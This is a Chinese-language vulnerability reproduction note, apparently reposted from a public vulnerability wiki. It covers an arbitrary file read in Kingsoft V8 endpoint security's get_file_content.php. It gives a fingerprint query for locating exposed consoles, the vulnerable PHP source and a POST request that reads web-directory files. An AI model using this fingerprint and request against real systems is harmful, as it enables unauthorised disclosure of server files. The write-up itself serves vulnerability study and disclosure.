---
title: "金山 V8 终端安全系统 get_file_content.php 任意文件读取漏洞"
date: 2026-10-16 09:11:39
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "金山"
tags:
  - "金山"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件

## 漏洞影响

```
金山 V8 终端安全系统
```

## 网络测绘

```
title="在线安装-V8+终端安全系统Web控制台"
```

## 漏洞复现

登录页面

![image-20220525150449778](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251504895.png)

存在漏洞的文件`/Console/receive_file/get_file_content.php`

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php  
  if(stripos(&#36;_POST['filepath'],"..") !== false) {
    echo 'no file founggd';
    exit();
  }
  ini_set("open_basedir", "../");
  $file_path = '../'.iconv("utf-8","gb2312",&#36;_POST['filepath']);
  if(!file_exists($file_path)){
    echo 'no file founggd';
    exit();
  }  

  $fp=fopen($file_path,"r");  
  $file_size=filesize($file_path); 

  $buffer=5024;  
  $file_count=0;  

  while(!feof($fp) &amp;&amp; $file_count&lt;$file_size){  
    $file_con=fread($fp,$buffer);  
    $file_count+=$buffer;  
    echo $file_con;  
  }  
  fclose($fp);  
?&gt;</code></pre>

</details>



文件中没有任何的过滤 通过 filepaht 参数即可下载任意文件

由于不能出现 `..` ，所以只能读取web目录下的文件

```
POST /receive_file/get_file_content.php

filepath=login.php
```

![image-20220525150700239](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251507315.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%87%91%E5%B1%B1-V8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
